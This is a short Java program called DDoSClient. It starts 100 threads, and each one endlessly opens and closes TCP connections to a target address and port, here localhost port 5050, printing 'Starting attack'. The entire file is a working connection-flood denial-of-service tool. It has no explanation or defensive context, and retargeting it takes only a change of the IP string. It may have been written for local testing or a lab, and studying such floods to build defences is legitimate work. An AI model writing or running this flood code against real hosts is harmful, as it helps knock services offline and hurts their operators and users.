import java.io.IOException;
import java.net.Socket;

public class DDoSClient {
    public static void main(String[] args) {
        String targetIP = "127.0.0.1"; // localhost
        int port = 5050;
        int threadCount = 100; // number of threads (adjust based on your system)

        System.out.println("⚠️ Starting attack with " + threadCount + " threads...");

        for (int i = 0; i < threadCount; i++) {
            Thread attackThread = new Thread(() -> {
                while (true) {
                    try {
                        Socket socket = new Socket(targetIP, port);
                        System.out.println("🔁 Sending request to " + targetIP + ":" + port);
                        socket.close();
                    } catch (IOException e) {
                        System.out.println("❌ Connection failed: " + e.getMessage());
                    }
                }
            });

            attackThread.start();
        }
    }
}
